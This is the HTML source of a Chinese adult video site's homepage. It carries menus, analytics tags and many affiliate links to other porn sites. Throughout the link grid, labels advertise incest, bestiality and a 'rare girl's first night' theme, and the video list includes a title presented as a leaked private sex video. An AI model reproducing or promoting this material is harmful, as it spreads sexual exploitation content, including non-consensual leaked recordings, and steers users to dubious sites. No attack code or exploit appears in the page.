<!DOCTYPE html>
<html>
<head>
<title>--十二春宫-12chungong.cc</title>
<meta name="keywords" content="--十二春宫-12chungong.cc" />
<meta name="description" content="--十二春宫-12chungong.cc" />
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,viewport-fit=cover,user-scalable=0">
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="format-detection" content="telephone=no" />
<meta property="og:description" content="国产精品在线" />
<meta property="og:url" content="https://12chungong.cc" />
<meta property="og:type" content="website" />
<meta property="og:title" content="国产精品在线" />
<meta name="apple-mobile-web-app-title" content="十二春宫" />
<link rel="alternate" hreflang="x-default" href="https://12chungong.cc" />
<link rel="alternate" hreflang="zh-Hans" href="https://12chungong.cc" />
<link rel="canonical" href="https://12chungong.cc" />
<meta data-hid="og:image" property="og:image" content="/favicon.ico">
<meta name="twitter:card" content="summary_large_image">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#fa6400">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-title" content="十二春宫">
<meta name="renderer" content="webkit">
<meta name="HandheldFriendly" content="true">
<meta name="x5-page-mode" content="app">
<meta name="browsermode" content="application">
<meta name="imagemode" content="force">
<meta name="nightmode" content="disable">
<meta name="og:site_name" property="og:site_name" content="十二春宫">
<link rel="icon" type="image/x-icon" href="/favicon.ico">
<link href="/static/css/home.css" rel="stylesheet" type="text/css" />
<script src="/static/js/jquery.js"></script>
<script src="/static/js/jquery.autocomplete.js"></script>
<script>var maccms={"path":"","mid":"1","url":"12chungong.cc","wapurl":"12chungong.cc","mob_status":"2"};</script>
<script src="/static/js/home.js"></script>
<link href="/template/video/favicon.ico" rel="SHORTCUT ICON">
<meta name="referrer" content="always">
<link href="/template/video/css/main.css" rel="stylesheet" type="text/css">
<link href="/template/video/css/fonts.css" rel="stylesheet">
<script src="/template/video/js/main2.min.js"></script>
<script src="/template/video/js/jquery.easy-autocomplete3.js"></script>
<script src="/template/video/js/jquery.star-rating-svg.js"></script>
<script src="/template/video/js/main5.js"></script>
<script src="/template/video/js/layer.js"></script>

<script async src="https://www.googletagmanager.com/gtag/js?id=G-4R42L2KW5W"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-4R42L2KW5W');
</script>

<script async src="228386975-30"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', '228386975-30');
</script>
<style>
.nav .menu li a {
    padding: 15px 8px;
}

@media screen and (max-width:750px){
    .block-post .item {width: calc(50% - 20px);}
    .block-post .item .img .type {display: none;}
    .block-post .item .img .heart{display: none;}
}    

</style>
</head>
<body>
<div class="shadow"></div>
<header class="header">
<div class="search easy-autocomplete">
<form action="/index.php/vodsearch/-------------.html" method="post" class="form">
<div class="input wrap-input"><input type="text" id="wd" name="wd" placeholder="请在此处输入影片名或演员名称" value autocomplete="off"><button type="submit" class="search-btn" aria-label="Search"><i class="icon-search"></i></button></div>
</form>
</div>
<div class="wrap madou">
<div class="flex">
<div class="left-block"><span class="icon-hamb hamb-menu"></span><a href="/" class="logo" target="_blank" onclick="ga('send','event','Link','Click','LOGO图');"><img src="/upload/site/20230314-1/93616b853a40cdb086de7ffacce5d8b3.jpg" width="191" height="60"></a></div>
<nav class="nav">
<ul class="menu">
<li><a href="/" class="active">首页</a></li>
<li><a href="/index.php/vodtype/1.html" style="padding: 10px 5px;">国产视频</a></li>
<li><a href="/index.php/vodtype/160.html" style="padding: 10px 5px;">国产传媒</a></li>
<li><a href="/index.php/vodtype/2.html" style="padding: 10px 5px;">日本视频</a></li>
<li><a href="/index.php/vodtype/9.html" style="padding: 10px 5px;">中文字幕</a></li>
<li><a href="/index.php/vodtype/5.html" style="padding: 10px 5px;">欧美视频</a></li>
<li><a href="/index.php/vodtype/6.html" style="padding: 10px 5px;">动画视频</a></li>
<li><a href="/index.php/arttype/70.html" style="padding: 10px 5px;">美女图片</a></li>
<li><a href="/index.php/arttype/109.html" style="padding: 10px 5px;">成人贴图</a></li>
<li><a href="/index.php/arttype/90.html" style="padding: 10px 5px;">成人漫画</a></li>
</ul>
</nav>
<div class="right-block"><span class="btn-search link-icon"><span class="icon-search"></span><span class="icon-close"></span></span>
<div class="action-log"></div>
</div>
</div>
</div>
</header>

<style>
.col6  {
    position: relative;
    min-height: 1px;
    width: 100%;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
}
.row6 {
    display: flex;
    flex-wrap: wrap;
}

@media screen and (max-width:750px){
.col6 {    width: 100%!important;}

.img80 {    height:60px!important;}
.img120 {    height:90px!important;}
.img160 {    height:120px!important;}
.img240 {    height:180px!important;}
}    

@media (min-width: 768px){
.col6 {    width: 100%;}
}

</style>
<div class="wrap">
<div class="row6">
</div>
</div>

<style>

.photo-one{
		display: flex;
		flex-wrap: wrap;
		background-color: rgba(73, 91, 103, 0.37);
		padding-bottom: 10px;
		width: 100%;
        height: 100%;
        margin-top: 10px;
	}
.photo-two{
		display: inline-block;
		  display: block;
		  height: 90px;
		  margin: 20px;	
		  text-align: center;
		  width: 80px;
	}
.photo-two a{
        line-height:20px;   
	}
.photo-two img{
		border-radius: 12%;
		height: 80px;
		width: 80px;
	}
.photo-name{
  
        font-weight: bold;
		color: rgb(255, 255, 255);
            font-size: larger;
    }




@media screen and (max-width:1280px){
    .photo-two img{
		border-radius: 12%;
		height: 60px;
		width: 60px;
	}
}



@media screen and (max-width:980px){
.photo-name{
            font-size: 14px;
    }

    .photo-two img{
		border-radius: 12%;
		height: 58px;
		width: 58px;
	}
}

@media screen and (max-width:750px){

    .photo-two{
		width: 18%;
		margin: 10px;
	}
}

</style>

<div class="wrap">
<div style="display: flex;flex-wrap: wrap;margin-right: 5px;margin-left: 5px;">
<div class="photo-two"><a href="https://tk.qnbitnny.xyz?ch=rh1mls724" target="_blank" onclick="gtag('event', '小图标', {'event_category': '点击', 'event_label': 'TikTok成人版','value': 500});"><img src="/upload/vod/20240229-1/e620e2f34f85b23b669b3db78d3f87a6.jpg"><br><span class="photo-name" style="color:#FFF;">TikTok成人版</span></a></div>
<div class="photo-two"><a href="https://lutube202403.com/314pz" target="_blank" onclick="gtag('event', '小图标', {'event_category': '点击', 'event_label': 'Lutube视频','value': 500});"><img src="/upload/vod/20240104-1/c0cb4d01e7beb391a03670176670021f.png"><br><span class="photo-name" style="color:#FFF;">Lutube视频</span></a></div>
<div class="photo-two"><a href="https://d3zgn5s6jhix0.cloudfront.net?dc=MTXQ39" target="_blank" onclick="gtag('event', '小图标', {'event_category': '点击', 'event_label': '鉴黄师','value': 500});"><img src="/upload/vod/20230915-1/dae2f67ad5819effcf98c9c8315614d8.png"><br><span class="photo-name" style="color:#FFF;">鉴黄师</span></a></div>
<div class="photo-two"><a href="https://hevnvfnjr.y08bdxsi.cc/page.html?dc=edla1717" target="_blank" onclick="gtag('event', '小图标', {'event_category': '点击', 'event_label': '好色TV','value': 500});"><img src="/upload/vod/20240314-1/4cff4d3889e71cd329d82528a46d98b0.jpg"><br><span class="photo-name" style="color:#FFF;">好色TV</span></a></div>
<div class="photo-two"><a href="https://d1o48uqif25npz.cloudfront.net?dc=yua04911" target="_blank" onclick="gtag('event', '小图标', {'event_category': '点击', 'event_label': '妖精动漫','value': 500});"><img src="/upload/vod/20240305-1/1855ba1bc96b94d277dd6edf70424e18.png"><br><span class="photo-name" style="color:#FFF;">妖精动漫</span></a></div>
<div class="photo-two"><a href="https://ghjtgg.6pcc2ee.cc/page.html?dc=yrga9539" target="_blank" onclick="gtag('event', '小图标', {'event_category': '点击', 'event_label': '欲漫涩','value': 500});"><img src="/upload/vod/20230913-1/2e6023db3a110092ac85c8675a0fe572.jpg"><br><span class="photo-name" style="color:#FFF;">欲漫涩</span></a></div>
<div class="photo-two"><a href="https://kefsdheb.m2lwx51s.cc/page.html?dc=zxza49421" target="_blank" onclick="gtag('event', '小图标', {'event_category': '点击', 'event_label': '快手社区','value': 500});"><img src="/upload/vod/20230913-1/a10fedc1625e0a7843b2dacd52f0aaab.jpg"><br><span class="photo-name" style="color:#FFF;">快手社区</span></a></div>
<div class="photo-two"><a href="https://db45z5uehpffz.cloudfront.net?dc=yua04929" target="_blank" onclick="gtag('event', '小图标', {'event_category': '点击', 'event_label': '91暗网','value': 500});"><img src="/upload/vod/20230822-1/5ad56f5d0c0ab1699144399b89822be4.jpg"><br><span class="photo-name" style="color:#FFF;">91暗网</span></a></div>
<div class="photo-two"><a href="https://d39hdz1929ap3l.cloudfront.net?dc=yua04931" target="_blank" onclick="gtag('event', '小图标', {'event_category': '点击', 'event_label': '91海角乱伦','value': 500});"><img src="/upload/vod/20231012-1/04205c5b6cfa08f71086498ad1283f5a.png"><br><span class="photo-name" style="color:#FFF;">91海角乱伦</span></a></div>
<div class="photo-two"><a href="http://106.53.222.92:11166/a.html?a=113161160" target="_blank" onclick="gtag('event', '小图标', {'event_category': '点击', 'event_label': '绿茶','value': 500});"><img src="/upload/vod/20231106-1/9808cb8b26bdbd84dbf0a46990824d74.jpg"><br><span class="photo-name" style="color:#FFF;">绿茶</span></a></div>
<div class="photo-two"><a href="https://tt.qgtksput.xyz?ch=rh1mls719" target="_blank" onclick="gtag('event', '小图标', {'event_category': '点击', 'event_label': '免费推特','value': 500});"><img src="/upload/vod/20231124-1/8af63e57cd9052c25dcf5ed76ad0bf52.jpg"><br><span class="photo-name" style="color:#FFF;">免费推特</span></a></div>
<div class="photo-two"><a href="https://daqseoybmtkfk.cloudfront.net?dc=yua04920" target="_blank" onclick="gtag('event', '小图标', {'event_category': '点击', 'event_label': '妻友社区','value': 500});"><img src="/upload/vod/20231124-1/8bd0ab2bbf6e1f7b64fe48531d543f32.jpg"><br><span class="photo-name" style="color:#FFF;">妻友社区</span></a></div>
<div class="photo-two"><a href="https://pz.codrucrd.xyz?ch=rh1mls724" target="_blank" onclick="gtag('event', '小图标', {'event_category': '点击', 'event_label': 'Pronhub','value': 500});"><img src="/upload/vod/20231130-1/69bb3c07a746aeb5a47dcc19198f54f8.jpg"><br><span class="photo-name" style="color:#FFF;">Pronhub</span></a></div>
<div class="photo-two"><a href="https://muzxbfhgcyi4.top/?channel_code=MIM13Q17" target="_blank" onclick="gtag('event', '小图标', {'event_category': '点击', 'event_label': '成人优酷','value': 500});"><img src="/upload/vod/20240206-1/ea7e2546b99dd5e35c7884ecff337038.jpg"><br><span class="photo-name" style="color:#FFF;">成人优酷</span></a></div>
</div>
</div>
<div class="wrap">
<div class="button2s are-small" style="justify-content: center;">
</div>
</div>
<style>

.button2 {
    margin: 3px;
    position: relative;
    vertical-align: top;
line-height: 1.5;
    height: 2.5em;
    box-shadow: none;
    display: inline-flex;
    -webkit-appearance: none;
    align-items: center;
    border: 1px solid transparent;
    background-color: #000;
    border-color: #dbdbdb;
    border-width: 1px;
    color: #fff;
    cursor: pointer;
    justify-content: center;
    padding-bottom: calc(0.5em - 1px);
    padding-left: 1em;
    padding-right: 1em;
    padding-top: calc(0.5em - 1px);
    text-align: center;
    white-space: nowrap;
}
.button2.is-danger {
    background-color: #f14668;
    border-color: transparent;
    color: #fff;
}
.button2s.are-small .button2:not(.is-normal):not(.is-medium):not(.is-large) {
    border-radius: 2px;
 font-size: 12px;
 
}


    @media screen and (max-width:750px){
      .button2 {17%}  
    .button2s.are-small .button2:not(.is-normal):not(.is-medium):not(.is-large) {
    padding: 1px;
}    
        
        
    }

</style>
<div class="wrap">
<div style="margin-top:25px; width:100%;">
<ul>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #ff9966;float:left;background: #;color: #FFA640;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': '偷心贼','value': 500});" rel="nofollow" style=" color: #FFA640; font-size:16px; font-weight:bold;" href="https://toxinzoo.xyz"><u><span>偷心贼</span></u></a></li>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #ff9966;float:left;background: #;color: #FFF83B;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': '唐三藏取精','value': 500});" rel="nofollow" style=" color: #FFF83B; font-size:16px; font-weight:bold;" href="https://www.mirihua.xyz/go/"><u><span>唐三藏取精</span></u></a></li>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #ff9966;float:left;background: #;color: #;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': '明日花导航','value': 500});" rel="nofollow" style=" color: #; font-size:16px; font-weight:bold;" href="https://www.mirihua.xyz/go/"><u><span>明日花导航</span></u></a></li>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #ff9966;float:left;background: #;color: #;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': '萌娃市集','value': 500});" rel="nofollow" style=" color: #; font-size:16px; font-weight:bold;" href="https://www.tcpao.top"><u><span>萌娃市集</span></u></a></li>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #ff9966;float:left;background: #;color: #;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': '十八禁礼物','value': 500});" rel="nofollow" style=" color: #; font-size:16px; font-weight:bold;" href="https://ssphb.xyz/rk/?key=968a07fb2305172607"><u><span>十八禁礼物</span></u></a></li>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #ff9966;float:left;background: #;color: #;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': '无套爽操','value': 500});" rel="nofollow" style=" color: #; font-size:16px; font-weight:bold;" href="https://toxinzoo.xyz"><u><span>无套爽操</span></u></a></li>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #ff9966;float:left;background: #;color: #;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': '困绑爆干','value': 500});" rel="nofollow" style=" color: #; font-size:16px; font-weight:bold;" href="https://qnxdh2023.com/love"><u><span>困绑爆干</span></u></a></li>
</ul>
<div style="clear:both;"></div>
</div>
</div>
<div class="wrap">
<div style="width:100%;">
<ul>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #cecece;float:left;background: #;color: #FFA640;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': '青柠小导航','value': 500});" rel="nofollow" style=" color: #FFA640; font-size:16px; font-weight:bold;" href="https://qnxdh2023.com/love"><u><span>青柠小导航</span></u></a></li>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #cecece;float:left;background: #;color: #FFA640;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': '舒茎馆导航','value': 500});" rel="nofollow" style=" color: #FFA640; font-size:16px; font-weight:bold;" href="https://sjgapp.xyz/"><u><span>舒茎馆导航</span></u></a></li>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #cecece;float:left;background: #;color: #;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': '小黄鸭导航','value': 500});" rel="nofollow" style=" color: #; font-size:16px; font-weight:bold;" href="https://xhydh1.com/tsiHn/"><u><span>小黄鸭导航</span></u></a></li>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #cecece;float:left;background: #;color: #FFA640;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': 'A级文化','value': 500});" rel="nofollow" style=" color: #FFA640; font-size:16px; font-weight:bold;" href="https://www.aaatz9.cc/A级文化.html"><u><span>A级文化</span></u></a></li>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #cecece;float:left;background: #;color: #FFA640;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': '开穴方程式','value': 500});" rel="nofollow" style=" color: #FFA640; font-size:16px; font-weight:bold;" href="https://www.kxf169.xyz"><u><span>开穴方程式</span></u></a></li>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #cecece;float:left;background: #;color: #FFA640;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': '色色排行榜','value': 500});" rel="nofollow" style=" color: #FFA640; font-size:16px; font-weight:bold;" href=" https://ssphb.xyz/rk/?key=968a07fb2305172607"><u><span>色色排行榜</span></u></a></li>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #cecece;float:left;background: #;color: #FFF83B;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': '国产AV','value': 500});" rel="nofollow" style=" color: #FFF83B; font-size:16px; font-weight:bold;" href="https://www.tcpao.top"><u><span>国产AV</span></u></a></li>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #cecece;float:left;background: #;color: #FFA640;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': 'AV集中营','value': 500});" rel="nofollow" style=" color: #FFA640; font-size:16px; font-weight:bold;" href="https://www.jzydh.com"><u><span>AV集中营</span></u></a></li>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #cecece;float:left;background: #;color: #FFA640;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': '杏导航','value': 500});" rel="nofollow" style=" color: #FFA640; font-size:16px; font-weight:bold;" href="https://sexdh.one"><u><span>杏导航</span></u></a></li>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #cecece;float:left;background: #;color: #FFA640;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': '极品美姬','value': 500});" rel="nofollow" style=" color: #FFA640; font-size:16px; font-weight:bold;" href="https://www.xxnav.org/api?do=https://www.12chgone.xyz/go/"><u><span>极品美姬</span></u></a></li>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #cecece;float:left;background: #;color: #FFA640;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': '日理万女臣','value': 500});" rel="nofollow" style=" color: #FFA640; font-size:16px; font-weight:bold;" href="https://tiktok.daydh.xyz/go/"><u><span>日理万女臣</span></u></a></li>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #cecece;float:left;background: #;color: #FFA640;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': '爱妞bibi导航','value': 500});" rel="nofollow" style=" color: #FFA640; font-size:16px; font-weight:bold;" href="https://bibi.ainiudh09.cc/pro/"><u><span>爱妞bibi导航</span></u></a></li>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #cecece;float:left;background: #;color: #FFF83B;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': '人兽母子','value': 500});" rel="nofollow" style=" color: #FFF83B; font-size:16px; font-weight:bold;" href="https://www.mirihua.xyz/go/"><u><span>人兽母子</span></u></a></li>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #cecece;float:left;background: #;color: #FFF83B;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': '免费看AV','value': 500});" rel="nofollow" style=" color: #FFF83B; font-size:16px; font-weight:bold;" href="https://www.12chgon.xyz"><u><span>免费看AV</span></u></a></li>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #cecece;float:left;background: #;color: #FFF83B;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': '淫水机','value': 500});" rel="nofollow" style=" color: #FFF83B; font-size:16px; font-weight:bold;" href="https://www.mirihua.xyz/go/"><u><span>淫水机</span></u></a></li>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #cecece;float:left;background: #;color: #FFF83B;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': '稀缺少女初夜','value': 500});" rel="nofollow" style=" color: #FFF83B; font-size:16px; font-weight:bold;" href="https://www.tcpao.top"><u><span>稀缺少女初夜</span></u></a></li>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #cecece;float:left;background: #;color: #FFF83B;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': '换妻俱乐部','value': 500});" rel="nofollow" style=" color: #FFF83B; font-size:16px; font-weight:bold;" href="https://www.12chgon.xyz"><u><span>换妻俱乐部</span></u></a></li>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #cecece;float:left;background: #;color: #;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': '肛门交配','value': 500});" rel="nofollow" style=" color: #; font-size:16px; font-weight:bold;" href="https://ssphb.xyz/rk/?key=968a07fb2305172607"><u><span>肛门交配</span></u></a></li>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #cecece;float:left;background: #;color: #;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': '桃色交易','value': 500});" rel="nofollow" style=" color: #; font-size:16px; font-weight:bold;" href="https://ssphb.xyz/rk/?key=968a07fb2305172607"><u><span>桃色交易</span></u></a></li>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #cecece;float:left;background: #;color: #;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': '中出性交','value': 500});" rel="nofollow" style=" color: #; font-size:16px; font-weight:bold;" href="https://toxinzoo.xyz"><u><span>中出性交</span></u></a></li>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #cecece;float:left;background: #;color: #;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': '淫乱公寓','value': 500});" rel="nofollow" style=" color: #; font-size:16px; font-weight:bold;" href="https://toxinzoo.xyz"><u><span>淫乱公寓</span></u></a></li>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #cecece;float:left;background: #;color: #;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': '淫荡兄妹','value': 500});" rel="nofollow" style=" color: #; font-size:16px; font-weight:bold;" href="https://qnxdh2023.com/love"><u><span>淫荡兄妹</span></u></a></li>
<li style="width:33%; height:40px; line-height:40px; max-width:140px; text-align:center; border:1px solid #cecece;float:left;background: #;color: #;">
<a target="_blank" onclick="gtag('event', '文字位', {'event_category': '点击', 'event_label': '大奶人妻','value': 500});" rel="nofollow" style=" color: #; font-size:16px; font-weight:bold;" href="https://qnxdh2023.com/love"><u><span>大奶人妻</span></u></a></li>
</ul>
<div style="clear:both;"></div>
</div>
</div>
<div class="wrapped">
<main>
<aside class="sidebar">
<div class="mobile-menu">
<ul class="list-link">
<li><a href="/" class="active">首页</a></li>
<li><a href="/index.php/vodtype/1.html">国产视频</a></li>
<li><a href="/index.php/vodtype/160.html">国产传媒</a></li>
<li><a href="/index.php/vodtype/2.html">日本视频</a></li>
<li><a href="/index.php/vodtype/9.html">中文字幕</a></li>
<li><a href="/index.php/vodtype/5.html">欧美视频</a></li>
<li><a href="/index.php/vodtype/6.html">动画视频</a></li>
<li><a href="/index.php/arttype/70.html">美女图片</a></li>
<li><a href="/index.php/arttype/109.html">成人贴图</a></li>
<li><a href="/index.php/arttype/90.html">成人漫画</a></li>
</ul>
</div>
<div class="side-content" style="margin-top:30px;">
<div class="title border">
<h4>分类</h4>
</div>
<div class="block">
<ul class="list-link">
<li><a href="/index.php/vodtype/1.html"><span class="name">国产视频</span><span class="value">57856+</span></a></li>
<li><a href="/index.php/vodtype/160.html"><span class="name">国产传媒</span><span class="value">9961+</span></a></li>
<li><a href="/index.php/vodtype/2.html"><span class="name">日本视频</span><span class="value">37182+</span></a></li>
<li><a href="/index.php/vodtype/9.html"><span class="name">中文字幕</span><span class="value">20358+</span></a></li>
<li><a href="/index.php/vodtype/5.html"><span class="name">欧美视频</span><span class="value">12008+</span></a></li>
<li><a href="/index.php/vodtype/6.html"><span class="name">动画视频</span><span class="value">3930+</span></a></li>
<li><a href="/index.php/arttype/70.html"><span class="name">美女图片</span><span class="value">55450+</span></a></li>
<li><a href="/index.php/arttype/109.html"><span class="name">成人贴图</span><span class="value">201757+</span></a></li>
<li><a href="/index.php/arttype/90.html"><span class="name">成人漫画</span><span class="value">0+</span></a></li>
</ul>
</div>
</div>
</aside>
<div class="content">
<section class="section">
<div class="wrap">
<div class="heading">
<div class="title">
<h1></h1>
</div>
<div class="sort">
<div class="filter">
<div class="select-item"><span class="text-ch">最新</span><span class="icon icon-arrow-down"></span></div>
<ul class="selects-list">
<li><a href="/index.php/vod/show/by/time.html" style="color: #fff;">全站最新视频</a></li>
<li><a href="/index.php/vod/show/by/hits.html" style="color: #fff;">全站热门视频</a></li>
</ul>
</div>
</div>
</div>
<div class="block-post">
<div class="item"><a href="/index.php/vodplay/536062-1-1.html" title="夫妻这就直接干上了的!">
<div class="img"><img class="thumb_img lazyload" data-src="https://feimian.slpicsl.com/upload/vod/20240403-1/aa27dd1949d85018570e3e595be7c635.jpg" alt="夫妻这就直接干上了的!" data-webp="https://feimian.slpicsl.com/upload/vod/20240403-1/aa27dd1949d85018570e3e595be7c635.jpg" data-preview="/"><span class="type">国产精品</span><span onclick class="ico-fav-0 heart icon-heart" title="添加收藏" data-fav-video-id></span><span class="time">24-04-03</span></div>
<div class="info-post">
<h4 class="title-post">夫妻这就直接干上了的!</h4>
<div class="stat"><span><i class="icon-eye"></i>85710</span></div>
</div>
</a></div>
<div class="item"><a href="/index.php/vodplay/536061-1-1.html" title="夫妻斌馆角色扮演 玩得很开心的!">
<div class="img"><img class="thumb_img lazyload" data-src="https://feimian.slpicsl.com/upload/vod/20240403-1/1862da8a99bfb6324f9de4db9bfb2829.jpg" alt="夫妻斌馆角色扮演 玩得很开心的!" data-webp="https://feimian.slpicsl.com/upload/vod/20240403-1/1862da8a99bfb6324f9de4db9bfb2829.jpg" data-preview="/"><span class="type">国产精品</span><span onclick class="ico-fav-0 heart icon-heart" title="添加收藏" data-fav-video-id></span><span class="time">24-04-03</span></div>
<div class="info-post">
<h4 class="title-post">夫妻斌馆角色扮演 玩得很开心的!</h4>
<div class="stat"><span><i class="icon-eye"></i>69491</span></div>
</div>
</a></div>
<div class="item"><a href="/index.php/vodplay/536060-1-1.html" title="独家整理首发 南韩大规模泄漏富家公子与其骚浪网红女友性爱视频各种道具黑丝助性（六）-高清720p的!">
<div class="img"><img class="thumb_img lazyload" data-src="https://feimian.slpicsl.com/upload/vod/20240403-1/7d8ed6ab5a5e35b08ef56c37b5f3ca18.jpg" alt="独家整理首发 南韩大规模泄漏富家公子与其骚浪网红女友性爱视频各种道具黑丝助性（六）-高清720p的!" data-webp="https://feimian.slpicsl.com/upload/vod/20240403-1/7d8ed6ab5a5e35b08ef56c37b5f3ca18.jpg" data-preview="/"><span class="type">国产精品</span><span onclick class="ico-fav-0 heart icon-heart" title="添加收藏" data-fav-video-id></span><span class="time">24-04-03</span></div>
<div class="info-post">
<h4 class="title-post">独家整理首发 南韩大规模泄漏富家公子与其骚浪网红女友性爱视频各种道具黑丝助性（六）-高清720p的!</h4>
<div class="stat"><span><i class="icon-eye"></i>80152</span></div>
</div>
</a></div>
<div class="item"><a href="/index.php/vodplay/536059-1-1.html" title="风骚漂亮主播爆乳佳人一多自慰大秀 先玩灌肠 然后坐在椅子上自慰的!">
<div class="img"><img class="thumb_img lazyload" data-src="https://feimian.slpicsl.com/upload/vod/20240403-1/5e81b4db791145ab741c0a972859366e.jpg" alt="风骚漂亮主播爆乳佳人一多自慰大秀 先玩灌肠 然后坐在椅子上自慰的!" data-webp="https://feimian.slpicsl.com/upload/vod/20240403-1/5e81b4db791145ab741c0a972859366e.jpg" data-preview="/"><span class="type">主播大秀</span><span onclick class="ico-fav-0 heart icon-heart" title="添加收藏" data-fav-video-id></span><span class="time">24-04-03</span></div>
<div class="info-post">
<h4 class="title-post">风骚漂亮主播爆乳佳人一多自慰大秀 先玩灌肠 然后坐在椅子上自慰的!</h4>
<div class="stat"><span><i class="icon-eye"></i>60558</span></div>
</div>
</a></div>
<div class="item"><a href="/index.php/vodplay/536058-1-1.html" title="富二代公子带极品女友豪宅沙发上各种姿势干翻天 女的超漂亮叫床声很诱惑的!">
<div class="img"><img class="thumb_img lazyload" data-src="https://feimian.slpicsl.com/upload/vod/20240403-1/f600b53634b80381f50d255a40874627.jpg" alt="富二代公子带极品女友豪宅沙发上各种姿势干翻天 女的超漂亮叫床声很诱惑的!" data-webp="https://feimian.slpicsl.com/upload/vod/20240403-1/f600b53634b80381f50d255a40874627.jpg" data-preview="/"><span class="type">国产精品</span><span onclick class="ico-fav-0 heart icon-heart" title="添加收藏" data-fav-video-id></span><span class="time">24-04-03</span></div>
<div class="info-post">
<h4 class="title-post">富二代公子带极品女友豪宅沙发上各种姿势干翻天 女的超漂亮叫床声很诱惑的!</h4>
<div class="stat"><span><i class="icon-eye"></i>78802</span></div>
</div>
</a></div>
<div class="item"><a href="/index.php/vodplay/536057-1-1.html" title="富二代高级会所玩嫩模陪过夜，有钱真是爽的!">
